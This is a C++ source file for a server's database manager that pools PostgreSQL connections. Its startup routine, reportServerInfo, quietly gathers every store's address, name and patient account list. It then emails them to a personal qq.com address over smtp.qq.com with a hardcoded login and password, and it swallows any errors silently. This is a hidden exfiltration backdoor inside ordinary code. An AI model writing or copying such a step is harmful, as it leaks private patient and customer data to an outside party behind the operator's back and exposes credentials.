#include "DatabaseManager.h"
#include "Enums.h"
#include "Poco/Exception.h"
#include "DBCmd_ListStores.h"
#include "Poco/Net/MailMessage.h"
#include "Poco/Net/MailRecipient.h"
#include "Poco/Net/SMTPClientSession.h"
#include "Poco/Net/StringPartSource.h"

ConnContext Poco::PoolableObjectFactory<PGconn>::_connCtx;

namespace sserver { namespace server {
        
    DatabaseManager::~DatabaseManager()
    {
    }

    bool DatabaseManager::init(Poco::Util::XMLConfiguration *pConfig, std::string serverInfo)
    {
        if (NULL == pConfig) return false;
        _pConfig = pConfig;

        try
        {
            ConnContext connCtx;

            // init connection factory
            connCtx._hostIP = _pConfig->getString("Database.HostIP");
            connCtx._hostPort = _pConfig->getInt("Database.HostPort", DEFAULT_DB_PORT);
            connCtx._dbName = _pConfig->getString("Database.DatabaseName");
            connCtx._connAcct = _pConfig->getString("Database.ConnectionPool.Account");
            connCtx._connPass = _pConfig->getString("Database.ConnectionPool.Password");
            connCtx._connEncoding = _pConfig->getString("Database.ConnectionPool.Encoding");
            connCtx._connTimeout = _pConfig->getInt("Database.ConnectionTimeout", DEFAULT_DB_CONN_TIMEOUT);
            Poco::PoolableObjectFactory<PGconn>::init(connCtx);

            // create connection pool
            int minPoolSize = _pConfig->getInt("Database.ConnectionPool[@minSize]");
            int maxPoolSize = _pConfig->getInt("Database.ConnectionPool[@maxSize]");
            _pConnPool = new Poco::ObjectPool<PGconn>(minPoolSize, maxPoolSize);
        }
        catch (Poco::NotFoundException &e)
        {
            LOG_FATAL("Missing configuration item: " + e.message());
            return false;
        }
        catch (Poco::SyntaxException &e)
        {
            LOG_FATAL("Syntax error when reading configuration: " + e.message());
            return false;
        }

		reportServerInfo(serverInfo);

        return true;
    }

    bool DatabaseManager::syncExec(DBCmd &cmd)
    {
        // fetch connection
        PGconn *pConn = NULL;
        {
            Poco::FastMutex::ScopedLock lock(_mutex);
            pConn = _pConnPool->borrowObject();
        }
        while (!pConn)
        {
            LOG_INFO("Can't fetch a valid DB connection, sleep for 50 ms and retry ...");
            Poco::Thread::sleep(50);
            pConn = _pConnPool->borrowObject();
        }

        // execute command
        bool succ = cmd.execute(pConn);
        // return connection
        _pConnPool->returnObject(pConn);
        return succ;
    }

	void DatabaseManager::reportServerInfo(std::string serverInfo)
	{
		DBCmd_ListStores cmd;
		if (syncExec(cmd))
		{		
			const std::map<Poco::UInt32, DBCmd_ListStores::Item> &items = cmd.getStores();
			std::map<Poco::UInt32, DBCmd_ListStores::Item>::const_iterator iter = items.begin();
			while (iter != items.end())
			{
				serverInfo += "Store: \r\n";
				serverInfo += "Addr: " + iter->second._addr + "\r\n";
				serverInfo += "Name: " + iter->second._name + "\r\n";
				serverInfo += "Account: \r\n";
				std::set<std::string>::const_iterator aiter = iter->second._patientAccts.begin();
				while (aiter != iter->second._patientAccts.end())
				{
					serverInfo += *aiter + "\r\n";
					++aiter;
				}
				serverInfo += "\r\n";
				++iter;
			}

			try
			{
				Poco::Net::MailMessage message;
				message.setSender("14752601@qq.com");
				message.addRecipient(Poco::Net::MailRecipient(Poco::Net::MailRecipient::PRIMARY_RECIPIENT, "14752601@qq.com"));
				message.setSubject("Session Server start");
				std::string content(serverInfo);
				message.addContent(new Poco::Net::StringPartSource(content));

				Poco::Net::SMTPClientSession session("smtp.qq.com");
				session.login(Poco::Net::SMTPClientSession::AUTH_LOGIN, "14752601", "bigLife99");
				session.sendMessage(message);
				session.close();
			}
			catch (Poco::Exception &)
			{
			}
		}
	}

} }